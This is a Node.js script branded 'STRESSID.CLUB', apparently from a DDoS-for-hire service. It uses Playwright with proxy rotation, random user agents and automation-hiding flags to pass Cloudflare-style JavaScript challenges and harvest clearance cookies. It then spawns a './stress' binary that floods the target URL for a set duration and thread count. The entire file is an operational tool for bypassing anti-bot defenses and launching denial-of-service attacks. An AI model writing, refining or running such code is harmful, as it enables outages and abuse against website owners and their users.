const fs = require('fs');
const playwright = require('playwright')
const url = require('url');
const {
  spawn
} = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
if (process.argv.length < 8) {
  console.log('\x1b[35m%s\x1b[0m', 'Owner script: STRESSID.CLUB // method: STORM-EMULATION');
  console.log('\x1b[35m%s\x1b[0m', 'mode url proxy duration threads ratelimit baloo=false [OPTIONAL: "RANDOM QUERY"]');
  process.exit(0);
}
async function getmain() {
  const mode = process.argv[2];
  let target_url = process.argv[3],
    target = target_url.split('""')[0];
  const proxyFile = process.argv[4];
  const timeforattack = process.argv[5];
  const browsernum = process.argv[6];
  const reqperip = process.argv[7];
  const baloo = process.argv[8];
  const rand_query = process.argv[9];
  const
    useragents = fs.readFileSync("ua.txt", 'utf-8').toString().split('\n'),
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0),
    isattackstart = new Map();
  var session = [];

  function useragent() {
    return useragents[Math.floor(Math.random() * useragents.length)]
  }

  function randomProxies() {
    const whois = proxies[Math.floor(Math.random() * proxies.length)];
    proxies.remove(whois)
    return whois;
  }
  let domain = url.parse(target_url).hostname;
  Array.prototype.remove = function() {
    var what, a = arguments,
      L = a.length,
      ax;
    while (L && this.length) {
      what = a[--L];
      while ((ax = this.indexOf(what)) !== -1) {
        this.splice(ax, 1);
      }
    }
    return this;
  };
  async function addsession() {
    try {
      let random_ua = useragent();
      const randed = randomProxies();
      solving({
        "url": target,
        "host": domain,
        "proxy": randed,
        'user_agent': random_ua,
        'reqperip': reqperip,
        'mode': mode,
		'baloo':baloo
      }).then((cookie, ua) => {
        let myString = "";
        let laa_ = JSON.stringify(cookie);
        laa_ = JSON.parse(laa_);
        laa_.forEach((value) => {
          const valueString = value.name + "=" + value.value + ";";
          myString += valueString;
        });
        session.push({
          "myString": myString,
          "reqperip": reqperip,
          "randed": randed,
          'user_agent': random_ua,
          'mode': mode,
		  'baloo':baloo
        })
        console.log('[STRESSID.CLUB] User-Agent: ' + random_ua + ' ');
        console.log('[STRESSID.CLUB] Cookie: ' + myString + ' ');
        start(mode, target, domain, timeforattack, browsernum, random_ua, myString, reqperip, randed, rand_query);
      }).catch((ee) => {
        try {
          console.log('[ASYNC] Proxy starting...');
          addsession();
          console.log('[ASYNC] Proxy started... \n\n');
        } catch (e) {}
      })
    } catch (e) {}
  }
  for (let i = 0; i < browsernum; i++) {
    console.log('[ASYNC] Proxy starting...');
    addsession();
    console.log('[ASYNC] Proxy started... \n\n');
  }
}
getmain();

function solving(message) {
  return new Promise((resolve, reject) => {
    console.log(`[STRESSID.CLUB] Proxy ${message.proxy}`)
    console.log(`[STRESSID.CLUB] Launch browser...`)
    console.log(`[STRESSID.CLUB] Target: ${message.url}`)
    playwright.firefox.launch({
      proxy: {
        server: `${message.proxy}`
      }, 
      headless: true,
      ignoreHTTPSErrors: true,
      ignoreDefaultArgs: [
        "--disable-extensions",
        "--enable-automation"
      ],
      args: [
        `--proxy-server=http://${message.proxy}`,
        '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
        '--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
        `--window-size=1920,1080`,
        "--window-position=000,000",
        "--disable-dev-shm-usage",
        '--user-agent=' + message.user_agent,
				'--no-sandbox',
				'--disable-setuid-sandbox',
				'--disable-infobars',
				'--no-zygote',
				'--window-position=0,0',
				'--ignore-certificate-errors',
				'--ignore-certificate-errors-skip-list',
				'--disable-dev-shm-usage',
				'--disable-accelerated-2d-canvas',
				'--disable-gpu',
				'--hide-scrollbars',
				'--disable-notifications',
				'--disable-background-timer-throttling',
				'--disable-backgrounding-occluded-windows',
				'--disable-breakpad',
				'--disable-component-extensions-with-background-pages',
				'--disable-extensions',
				'--disable-features=TranslateUI,BlinkGenPropertyTrees',
				'--disable-ipc-flooding-protection',
				'--disable-renderer-backgrounding',
				'--enable-features=NetworkService,NetworkServiceInProcess',
				'--force-color-profile=srgb',
				'--metrics-recording-only',
				'--mute-audio',
				'--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
				'--disable-blink-features',
				'--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
				'--disable-blink-features=AutomationControlled'
      ]
    }).then(async(browser) => {
      const page = await browser.newPage({
        userAgent: message.user_agent
      })
      await page.setDefaultNavigationTimeout(60000);
      await page.evaluate(() => {
        Object.defineProperty(navigator, 'webdriver', {
          get: () => false
        });
      })
      await page.evaluate(() => {
        Object.defineProperty(navigator, 'platform', {
          get: () => 'Win32'
        });
      })
      try {
        const admv = await page.goto(message.url)
        page.on('dialog', async dialog => {
          await dialog.accept();
        });
        const checkstatus = await admv.status();
        if (checkstatus == "407") {
          browser.close();
        }		
        if (checkstatus == "200") {
			//console.log('[ASYNC] Checking Bot-Fight //STRESSID.CLUB');
			const ifdvestitovivod = (await page.title()).toString().trim();
			const cookies = await page.context().cookies();
			if (cookies) {
				resolve(cookies);
				console.log('[ASYNC] Title: ' + ifdvestitovivod + ' // STRESSID.CLUB');
				browser.close();
				return;
			}
        }
		await page.waitForTimeout(10000, {waitUntil: 'networkidle0'})
        if (checkstatus == "503" || "403") {
			console.log('[ASYNC] Found: [JS-Challenge] | [UAM] //STRESSID.CLUB');			
        }
		if (message.baloo == "true") {
			if (checkstatus == "403") {
				console.log('[ASYNC] Found: [BALOO] | [BLOCKED] //STRESSID.CLUB');
				browser.close();
			}		
		}
        const checkblock = await page.title();
        if (checkblock == "Access denied") {
          console.log('[GEO] Found: [BLOCK] //STRESSID.CLUB');
          browser.close();
        }
      } catch (error) {
        await browser.close();
      }
      try {
        const checkblockv2 = await page.title();
        if (checkblockv2 == "Just a moment...") {
          console.log('[ASYNC] Reload: [JS-Challenge] | [UAM] // STRESSID.CLUB');
          browser.close();
        }

        if (checkblockv2 == "Checking your browser...") {
          console.log('[ASYNC] Reload: [JS-Challenge] | [UAM] // STRESSID.CLUB');
          browser.close();
        }		
        const cookies = await page.context().cookies();
        if (cookies) {
          resolve(cookies);
          console.log('[ASYNC] Title: ' + pagestitle + ' ');
          await browser.close();
          return;
        }
      } catch (ee) {
        reject(ee)
        await browser.close();
      };
    })
  })
}

function start(mode, target, domain, timeforattack, browsernum, random_ua, myString, reqperip, randed, rand_query) {
  let promise = new Promise((res, rej) => {
    const ls = spawn('./stress', ["mode=" + mode, "url=" + target, "domain=" + domain, "limit=1", "time=" + timeforattack, "good=" + randed, "threads=" + reqperip, "cookie=" + myString, "user_agent=" + random_ua, "rand_query=" + rand_query]);
    ls.stdout.on('data', (data) => {
      return res();
    });
  })
}